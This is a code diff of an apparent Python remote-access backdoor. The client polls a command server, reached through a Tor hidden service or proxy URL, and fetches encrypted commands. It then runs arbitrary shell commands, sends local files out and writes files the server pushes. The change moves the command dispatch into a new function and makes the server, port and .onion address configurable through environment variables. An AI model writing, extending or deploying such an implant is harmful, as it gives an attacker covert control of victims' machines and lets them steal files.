@@ -67,6 +67,22 @@ def execution_response(cmd):
 	result=conn.read()
 
 
+
+def request_handler(cmd):
+	if cmd[0:5]=="quit:":
+		return False
+	elif cmd[0:9]=="download:":
+		execution_response("download:%s" % get_file_contents(cmd[9:len(cmd)]))
+		return True
+	elif cmd[0:7]=="upload:":
+		execution_response("upload:%s" % write_file_contents(cmd[7:len(cmd)]))
+		return True
+        else:
+		execution_response(execute_cmd(cmd))
+		return True
+
+
+
 def contact_server():
 	try:
 		command_output=""
@@ -76,18 +92,7 @@ def contact_server():
 		result=conn.read()
 		match= re.match(command_regexp, result)
 		if match!=None:
-			cmd=decrypt(binascii.unhexlify(match.groups()[0]),passwd)
-			if cmd[0:5]=="quit:":
-				return False
-			elif cmd[0:9]=="download:":
-				execution_response("download:%s" % get_file_contents(cmd[9:len(cmd)]))
-				return True
-			elif cmd[0:7]=="upload:":
-				execution_response("upload:%s" % write_file_contents(cmd[7:len(cmd)]))
-				return True
-                        else:
-				execution_response(execute_cmd(cmd))
-				return True
+			return request_handler(decrypt(binascii.unhexlify(match.groups()[0]),passwd))
 		else:
 			return True
 	except:
@@ -117,11 +122,36 @@ command_regexp="^cmd=(\w{1,})$"
 subcommand_download_regexp=""
 subcommand_upload_regexp=""
 passwd=password(20)
-server="tor-proxy.net"
-hidden_service="o3mco5aw544ls6du.onion"
-port="80"
-request_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/get.html" % hidden_service
-response_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/put.html" % hidden_service
+
+try:
+        server=os.environ['PYSERVER_IP']
+except KeyError:
+	server="127.0.0.1"
+	#server="tor-proxy.net"
+
+try:
+        port=os.environ['PYSERVER_PORT']
+except KeyError:
+	port="8080"
+	#port="80"
+
+try:
+        hidden_service=os.environ['HIDDEN_SERVICE']
+except KeyError:
+	hidden_service="o3mco5aw544ls6du.onion"
+
+#We will connect through Tor
+try:
+        os.environ['TOR_MODE']
+	request_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/get.html" % hidden_service
+	response_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/put.html" % hidden_service
+	port="80"
+
+except KeyError:
+	request_command_resource="/get.html" 
+	response_command_resource="/put.html"
+
+
 
 public={'e': 12765662626842123815481067847587949200661766245321760889709889046822638084481165784057284123054868562028885770753937873135895248452711698867322363573755509L, 'n': 6670204349974766786486025308702639754997599591560961604655174715263317636836612382523664666170516679176618161283459910889756304321912885967269425897143605737602153478507650483060215486084472859254809428113014384520628716870802560675634211006890817931766331058637157223278955216319037058031119518376261623441717669911594897972723612545099524624178297453680426328165227828416826977994411779382362869355088428553123931482139878281954231142991811152056548065569650847915153537291470173503926317706272431561647632937469021806777354282558079091000609427815612534260857745167512041714839987398717022508605411199651359095421L}
 
@@ -130,7 +160,6 @@ public={'e': 1276566262684212381548106784758794920066176624532176088970988904682
 
 
 def main():
-#print rsa.decrypt(rsa.encrypt(password(20),public),private)
 	forever=False
 	clock=1
 
